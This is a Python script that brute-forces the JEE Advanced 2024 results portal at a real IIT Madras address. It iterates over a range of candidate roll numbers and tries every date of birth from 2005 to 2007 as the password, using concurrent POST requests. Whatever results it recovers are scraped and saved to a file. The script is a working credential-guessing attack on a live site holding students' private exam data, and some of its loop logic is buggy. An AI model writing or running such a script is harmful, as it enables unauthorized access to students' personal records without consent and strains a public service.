import requests
from bs4 import BeautifulSoup
import datetime 
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

url = 'https://jeeadv.iitm.ac.in/result24/index.php'

def get_dates_of_month(year, month):
    dates = []
    current_date = datetime.date(year, month, 1)
    
    while current_date.month == month:
        formatted_date = current_date.strftime("%d-%m-%Y")
        dates.append(formatted_date)
        current_date += datetime.timedelta(days=1)
    
    return dates

def generate_dates_nested_list(years):
    all_dates = {}
    for year in years:
        nested_list = []
        for month in range(1, 13):  
            month_dates = get_dates_of_month(year, month)
            nested_list.append(month_dates)
        all_dates[year] = nested_list
    return all_dates


def data_scraper(resp):
    soup = BeautifulSoup(resp.content,'html.parser')
    data = soup.findAll('tr')
    data_dict = {}
    for i in data:
        temp = i.text.split('\n')
        
        for _ in temp:
            temp.remove('')

        if len(temp) == 1 and 'Result' in str(temp):
            temp = temp[0].split(':')
        elif len(temp) == 1:
            temp.clear()
            temp.append('dob')
            temp.append(password)
        data_dict[temp[0]] = temp[1]
    return data_dict

def post_req(url,payload):
    resp = requests.post(url,data=payload)
    result = data_scraper(resp)
    return result

def post_multiple_requests(url, payload_list):
    responses = []
    with ThreadPoolExecutor() as executor:
        future_to_data = {executor.submit(post_req, url, payload): payload for payload in payload_list}
        
        for future in as_completed(future_to_data):
            try:
                response = future.result()
                if response != {}:
                    responses.append(response)
                    break
            except Exception as e:
                print(f"An error occurred: {e}")
        #time.sleep(0.2)
    
    return responses
   
results = []
for username in range(242001071,242001101):
    print(f'checking for {username}')
    years = [2005,2006,2007]
    nested_dates = generate_dates_nested_list(years)
    passwords = []
    for year, dates in nested_dates.items():
        passwords += dates

    payload_list = []

    for i in passwords:
        for password in i:
            payload_list.append({'username':username,'password':password})
    

        response = post_multiple_requests(url,payload_list)
        if response != []:
            results.append(response)
            print('Found!')
            print()
            print(response)
            print()
            f = open('jee_adv_Result.txt','a')
            f.write(f'{response}\n')
            f.close()
            break
        else:
            print(f'DOB not till {password}')
            continue
print(results)
